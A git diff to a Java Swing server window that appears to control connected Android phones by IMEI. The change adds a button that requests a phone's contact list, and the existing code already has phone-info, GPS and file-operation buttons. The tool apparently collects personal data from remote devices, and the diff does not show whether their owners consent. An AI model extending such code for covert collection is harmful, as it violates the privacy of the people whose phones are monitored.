@@ -33,6 +33,7 @@ import javax.swing.table.TableModel;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import com.saiteng.Frame.ContactFrame;
 import com.saiteng.Frame.PhoneInfoFrame;
 import com.saiteng.connect.server.AndroidConnectClient;
 import com.saiteng.connect.server.AndroidConnectServer;
@@ -55,6 +56,7 @@ public class ConnectServerFrame extends JFrame implements ActionListener{
 	private JButton phoneButton;
 	
 	private JButton GPSButton;
+	
 	private JPanel panel;
 	
 	private JTextArea textArea;
@@ -186,6 +188,7 @@ public class ConnectServerFrame extends JFrame implements ActionListener{
 				if(IMEI!=null){
 					
 					connectServer.sendToClient(IMEI,"phone_info");
+					
 				}
 				
 			}
@@ -257,7 +260,7 @@ public class ConnectServerFrame extends JFrame implements ActionListener{
 					infoFrame.setVisible(true);
 
 				} catch (JSONException e) {
-					// TODO Auto-generated catch block
+				
 					e.printStackTrace();
 				}
 				
@@ -265,6 +268,24 @@ public class ConnectServerFrame extends JFrame implements ActionListener{
 				
 				JOptionPane.showMessageDialog(panel, "请勾选要查看的联系人", "标题",JOptionPane.WARNING_MESSAGE);  
 			}
+			
+		}else if(obj ==contactButton){
+			//通讯录窗体
+			if (IMEI != null) {
+				connectServer.sendToClient(IMEI,"contact_info");
+				
+				ContactFrame contact = new ContactFrame();
+				
+				Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+				
+				contact.setBounds((screenSize.width) / 6, (screenSize.height) / 6, 800, 500);
+
+				contact.setVisible(true);
+				
+			}else{
+				JOptionPane.showMessageDialog(panel, "请勾选要查看的联系人", "标题",JOptionPane.WARNING_MESSAGE);
+			}
+			
 			
 		} else if (obj == fileoperate) {
 			
